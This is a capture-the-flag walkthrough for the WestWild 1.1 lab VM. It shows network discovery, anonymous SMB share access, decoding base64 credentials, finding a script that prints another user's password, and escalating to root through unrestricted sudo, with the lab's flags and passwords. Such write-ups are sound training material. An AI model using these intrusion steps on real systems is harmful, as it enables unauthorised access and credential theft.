# WestWild 1.1

## 1.Get VM IP

```bash
root@kali: arp-scan -I eth1 -l

Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.127.1   00:50:56:c0:00:01       VMware, Inc.
192.168.127.250 00:0c:29:71:8d:bc       VMware, Inc.
192.168.127.254 00:50:56:f1:df:13       VMware, Inc.
```

The ip address is `192.168.127.250`, let's scan it.

## 2.Enumeration

```bash
root@kali: nmap -p22,80,139,445 -v -sC -sV -oN nmap.out 192.168.127.250

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 6f:ee:95:91:9c:62:b2:14:cd:63:0a:3e:f8:10:9e:da (DSA)
|   2048 10:45:94:fe:a7:2f:02:8a:9b:21:1a:31:c5:03:30:48 (RSA)
|   256 97:94:17:86:18:e2:8e:7a:73:8e:41:20:76:ba:51:73 (ECDSA)
|_  256 23:81:c7:76:bb:37:78:ee:3b:73:e2:55:ad:81:32:72 (ED25519)
80/tcp  open  http        Apache httpd 2.4.7 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.7 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 00:0C:29:71:8D:BC (VMware)
Service Info: Host: WESTWILD; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| nbstat: NetBIOS name: WESTWILD, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   WESTWILD<00>         Flags: <unique><active>
|   WESTWILD<03>         Flags: <unique><active>
|   WESTWILD<20>         Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-time: 
|   date: 2024-01-23T10:21:37
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: westwild
|   NetBIOS computer name: WESTWILD\x00
|   Domain name: \x00
|   FQDN: westwild
|_  System time: 2024-01-23T13:21:37+03:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h29m59s, deviation: 1h43m55s, median: 3h29m59s
```

Let's start with smb :

```bash
root@kali: smbclient --no-pass -L 192.168.127.250

Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        wave            Disk      WaveDoor
        IPC$            IPC       IPC Service (WestWild server (Samba, Ubuntu))
```

we can see the `wave` share is accessible, let's connect to it:

```bash
root@kali: smbclient --no-pass //192.168.127.250/wave

Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Tue Jul 30 01:18:56 2019
  ..                                  D        0  Thu Aug  1 19:02:20 2019
  FLAG1.txt                           N       93  Mon Jul 29 22:31:05 2019
  message_from_aveng.txt              N      115  Tue Jul 30 01:21:48 2019
```

now download these to files and check the content :

```text
root@kali: cat FLAG1.txt 
RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K

root@kali: cat message_from_aveng.txt 
Dear Wave ,
Am Sorry but i was lost my password ,
and i believe that you can reset  it for me . 
Thank You 
Aveng 
```

decode base64 message :

```bash
root@kali: echo -n 'RmxhZzF7V2VsY29tZV9UMF9USEUtVzNTVC1XMUxELUIwcmRlcn0KdXNlcjp3YXZleApwYXNzd29yZDpkb29yK29wZW4K' | base64 -d

Flag1{Welcome_T0_THE-W3ST-W1LD-B0rder}
user:wavex
password:door+open
```

## 3.Gaining Shell

Now we can ssh to system with the credentials : `wavex:door+open` :

```bash
wavex@WestWild:~$ id
uid=1001(wavex) gid=1001(wavex) groups=1001(wavex)

wavex@WestWild:~$ find / -group wavex 2>/dev/null | grep -v proc

/sys/fs/cgroup/systemd/user/1001.user/1.session
/sys/fs/cgroup/systemd/user/1001.user/1.session/tasks
/usr/share/av/westsidesecret/ififoregt.sh
/home/wavex
/home/wavex/.cache
/home/wavex/.cache/motd.legal-displayed
/home/wavex/wave/FLAG1.txt
/home/wavex/wave/message_from_aveng.txt
/home/wavex/.profile
/home/wavex/.bashrc
/home/wavex/.viminfo
/home/wavex/.bash_logout
/run/user/1001
```

we can see that we have access to `ififoregt.sh`, now check the content :

```bash
wavex@WestWild:~$ cat /usr/share/av/westsidesecret/ififoregt.sh

 #!/bin/bash 
 figlet "if i foregt so this my way"
 echo "user:aveng"
 echo "password:kaizen+80"
```

## 4.Privilege Escalation (aveng)

Now switch user to aveng :

```bash
wavex@WestWild:~$ su aveng
Password: 
aveng@WestWild:/home/wavex$ id
uid=1000(aveng) gid=1000(aveng) groups=1000(aveng),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(sambashare),114(lpadmin)

aveng@WestWild:/home/wavex$ sudo -l
[sudo] password for aveng: 
Matching Defaults entries for aveng on WestWild:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aveng may run the following commands on WestWild:
    (ALL : ALL) ALL
```

we have full access so we can be root


## 5.Privilege Escalation (root)

```bash
veng@WestWild:/home/wavex$ sudo su

root@WestWild:/home/wavex# cd /root

root@WestWild:~# cat FLAG2.txt 
Flag2{Weeeeeeeeeeeellco0o0om_T0_WestWild}

Great! take a screenshot and Share it with me in twitter @HashimAlshareff
```

This is how we can get root on this machine :)



